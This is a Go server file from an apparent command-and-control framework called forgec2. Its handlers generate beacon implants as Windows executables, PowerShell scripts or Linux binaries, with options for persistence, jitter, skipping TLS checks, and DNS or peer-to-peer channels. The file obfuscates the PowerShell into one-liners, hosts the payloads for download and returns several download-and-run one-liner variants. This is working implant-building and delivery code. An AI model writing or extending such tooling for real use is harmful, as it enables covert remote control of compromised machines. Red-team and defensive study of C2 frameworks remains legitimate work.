package server

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"

	"github.com/forgec2/forgec2/internal/obfuscation"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func (s *Server) handleGeneratePS1(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
	}
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return
	}

	// Listener is required
	if form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener is required")
		return
	}

	resolved, err := s.resolveListener(form.ListenerID)
	if err != nil {
		respondError(c, http.StatusBadRequest, "Invalid listener configuration")
		return
	}
	form.C2URL = resolved.C2URL
	form.Protocol = resolved.Protocol

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		Proxy:         form.Proxy,
	}

	ps1Code, err := payload.GeneratePowerShellSource(cfg, s.implantDataDir())
	if err != nil {
		s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
		return
	}

	oneLiner := obfuscation.GenerateCommandLineOneLiner(ps1Code)

	s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "success", "", "")
	c.JSON(http.StatusOK, gin.H{
		"success":         true,
		"code":            oneLiner,
		"original_length": len(ps1Code),
		"obfuscated_len":  len(oneLiner),
	})
}

// handleGenerateOneLiner generates a payload and returns 10+ one-liner variants
func (s *Server) handleGenerateOneLiner(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		PayloadType   string `form:"payload_type"` // "exe", "ps1", "linux"
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
		P2PMode       string `form:"p2p_mode"`
		P2PParent     string `form:"p2p_parent"`
		P2PListenAddr string `form:"p2p_listen_addr"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return
	}

	payloadType := form.PayloadType
	if payloadType == "" {
		payloadType = "exe"
	}

	// Validate and get listener
	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener or DNS/P2P config is required")
		return
	}

	if !isP2P && !isDNS {
		resolved, err := s.resolveListener(form.ListenerID)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid listener configuration")
			return
		}
		form.C2URL = resolved.C2URL
		form.Protocol = resolved.Protocol
		if resolved.DNSDomain != "" {
			form.DNSDomain = resolved.DNSDomain
			if form.DNSServer == "" {
				form.DNSServer = resolved.DNSServer
			}
		}
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_beacon",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		P2PMode:       p2pMode,
		P2PParent:     p2pParent,
		P2PListenAddr: p2pListenAddr,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
		Proxy:         form.Proxy,
		CryptoKey:     form.CryptoKey,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	// Generate the payload
	var (
		genPath  string
		genErr   error
		ps1Code  string
		filename string
		format   string
	)
	switch payloadType {
	case "exe":
		genPath, genErr = payload.GenerateWindowsEXE(cfg, agentsDir)
		filename = "beacon.exe"
		format = "exe"
	case "ps1":
		ps1Code, genErr = payload.GeneratePowerShellSource(cfg, s.implantDataDir())
		filename = "beacon.ps1"
		format = "ps1"
	case "linux":
		genPath, genErr = payload.GenerateLinuxELF(cfg, agentsDir)
		filename = "beacon.elf"
		format = "elf"
	default:
		respondError(c, http.StatusBadRequest, "invalid payload_type, must be exe, ps1, or linux")
		return
	}

	if genErr != nil {
		s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(genErr, "Payload generation"))
		return
	}

	// Copy the payload to the hosted payloads directory for download
	payloadsDir := filepath.Join(s.cfg.Server.DataDir, "payloads")
	if err := os.MkdirAll(payloadsDir, 0755); err != nil {
		s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
		return
	}

	payloadID := uuid.New().String()
	payloadSubDir := filepath.Join(payloadsDir, payloadID)
	if err := os.MkdirAll(payloadSubDir, 0755); err != nil {
		s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
		return
	}

	hostPath := filepath.Join(payloadSubDir, filename)

	if payloadType == "ps1" {
		if err := os.WriteFile(hostPath, []byte(ps1Code), 0644); err != nil {
			s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
			respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
			return
		}
	} else {
		input, readErr := os.ReadFile(genPath)
		if readErr != nil {
			s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
			respondError(c, http.StatusInternalServerError, sanitizeError(readErr, "Payload generation"))
			return
		}
		if err := os.WriteFile(hostPath, input, 0644); err != nil {
			s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
			respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
			return
		}
	}

	// Build the download URL from the current request
	scheme := "http"
	if c.Request.TLS != nil {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s", scheme, c.Request.Host)
	payloadURL := fmt.Sprintf("%s/payloads/%s/%s", baseURL, payloadID, filename)

	// Generate one-liner variants
	oneLiners := buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, form.Proxy)

	s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "success", "", hostPath)
	c.JSON(http.StatusOK, gin.H{
		"success":      true,
		"payload_id":   payloadID,
		"filename":     filename,
		"download_url": payloadURL,
		"types":        oneLiners,
	})
}

// handleServePayload serves hosted payload files for one-liner download
func (s *Server) handleServePayload(c *gin.Context) {
	payloadID := c.Param("id")
	filename := c.Param("filename")
	if payloadID == "" || filename == "" {
		c.String(http.StatusBadRequest, "Invalid path")
		return
	}

	payloadPath := filepath.Join(s.cfg.Server.DataDir, "payloads", payloadID, filename)
	allowedDir := filepath.Join(s.cfg.Server.DataDir, "payloads")
	if err := validateFilePath(payloadPath, allowedDir); err != nil {
		c.String(http.StatusForbidden, "forbidden")
		return
	}
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		c.Status(http.StatusNotFound)
		return
	}
	serveFileSafe(c, payloadPath, allowedDir, filename)
}
